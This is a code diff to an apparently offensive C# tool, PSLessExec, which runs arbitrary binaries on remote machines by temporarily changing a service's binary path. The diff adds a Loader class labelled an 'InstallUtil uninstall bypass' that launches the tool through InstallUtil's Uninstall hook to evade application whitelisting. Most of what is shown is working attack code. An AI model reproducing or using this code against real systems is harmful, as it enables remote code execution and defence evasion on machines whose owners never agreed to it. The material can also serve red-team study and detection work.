@@ -1,5 +1,7 @@
 ﻿using System;
 using System.Runtime.InteropServices;
+using System.Collections.Generic;
+using System.Linq;
 
 namespace PSLessExec
 {
@@ -96,6 +98,62 @@ namespace PSLessExec
             // Pass 3: Restore original binPath
             bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, 0, binPathOrig, null, null, null, null, null, null);
             Console.WriteLine($"Restored service binary to '{binPathOrig}', result: {bResult}.");
+        }
+    }
+
+    // InstallUtill uninstall bypass
+    [System.ComponentModel.RunInstaller(true)]
+    public class Loader : System.Configuration.Install.Installer
+    {
+        public override void Uninstall(System.Collections.IDictionary savedState)
+        {
+            base.Uninstall(savedState);
+            List<string> argslist = new List<string>();
+            string lParam1 = Convert.ToString(GetParam("Target"));
+            string lParam2 = Convert.ToString(GetParam("Service"));
+            string lParam3 = Convert.ToString(GetParam("BinaryToRun"));
+            
+            argslist.Add(lParam1);
+            argslist.Add(lParam2);
+            argslist.Add(lParam3);
+
+            String[] args = argslist.ToArray();
+
+            Program.Main(args);
+        }
+
+        private object GetParam(string p)
+        {
+            string[] inputvars = new string[] { "Target", "Service", "BinaryToRun" };
+            try
+            {
+                if (this.Context != null)
+                {
+                    if (this.Context.Parameters[p] != null && inputvars.Contains(p))
+                    {
+                        string lParamValue = this.Context.Parameters[p];
+                        if (lParamValue == "")
+                        {
+                            Console.WriteLine("You have provided a parameter that must be assigned a value: " + p);
+                            System.Environment.Exit(0);
+                        }
+                        else if (lParamValue != null)
+                            return "/" + p + ":" + lParamValue;
+                    }
+                    else if (this.Context.Parameters[p] != null && Array.Exists(inputvars, element => element != p))
+                    {
+                        string lParamValue = "/" + p;
+                        return lParamValue;
+                    }
+                    else
+                    {
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+            }
+            return string.Empty;
         }
     }
 }
